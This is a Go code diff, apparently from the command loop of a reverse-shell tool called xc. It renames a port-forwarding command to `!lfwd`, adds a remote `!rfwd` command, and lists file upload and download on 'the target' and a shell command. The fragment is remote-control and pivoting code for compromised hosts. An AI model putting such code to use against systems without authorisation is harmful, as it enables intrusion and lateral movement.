@@ -19,32 +19,6 @@ import (
 	"github.com/hashicorp/yamux"
 )
 
-func prompt(c net.Conn) {
-	cwd, err := os.Getwd()
-	if err != nil {
-		cwd = "?"
-	}
-	fmt.Fprintf(c, fmt.Sprintf("[xc: %s]: ", cwd))
-}
-
-func forward(host string, port string, s *yamux.Session, c net.Conn) {
-	for {
-		proxy, err := s.Accept()
-		if err != nil {
-			log.Println(err)
-			return
-		}
-		fwdCon, err := net.Dial("tcp", fmt.Sprintf("%s:%s", host, port))
-		if err != nil {
-			log.Println(err)
-			return
-		}
-		defer fwdCon.Close()
-		go utils.CopyIO(fwdCon, proxy)
-		go utils.CopyIO(proxy, fwdCon)
-	}
-}
-
 // Run runs the mainloop of the shell
 func Run(s *yamux.Session, c net.Conn) {
 	defer c.Close()
@@ -71,8 +45,10 @@ func Run(s *yamux.Session, c net.Conn) {
 				usage += "   - uploads a file to the target\n"
 				usage += " !download <src> <dst>\n"
 				usage += "   - downloads a file from the target\n"
-				usage += " !portfwd <localport> <remoteaddr> <remoteport>\n"
-				usage += "   - local portforwarding (similar to ssh -L)\n"
+				usage += " !lfwd <localport> <remoteaddr> <remoteport>\n"
+				usage += "   - local portforwarding (like ssh -L)\n"
+				usage += " !rfwd <remoteport> <localaddr> <localport>\n"
+				usage += "   - remote portforwarding (like ssh -R)\n"
 				usage += " !plugins\n"
 				usage += "   - lists available plugins\n"
 				usage += " !plugin <plugin>\n"
@@ -124,13 +100,21 @@ func Run(s *yamux.Session, c net.Conn) {
 					c.Write([]byte("Usage: !download <src> <dst>\n"))
 				}
 				prompt(c)
-			case "!portfwd":
+			case "!lfwd":
 				if len(argv) == 4 {
 					host := argv[2]
 					port := argv[3]
-					go forward(host, port, s, c)
+					go lfwd(host, port, s, c)
 				} else {
-					c.Write([]byte("Usage: !portfwd <localport> <remoteaddr> <remoteport>\n"))
+					c.Write([]byte("Usage: !lfwd <localport> <remoteaddr> <remoteport> (opens local port)\n"))
+				}
+				prompt(c)
+			case "!rfwd":
+				if len(argv) == 4 {
+					port := argv[1]
+					go rfwd(port, s, c)
+				} else {
+					c.Write([]byte("Usage: !rfwd <remoteport> <localaddr> <localport> (opens remote port)\n"))
 				}
 				prompt(c)
 			case "!shell":
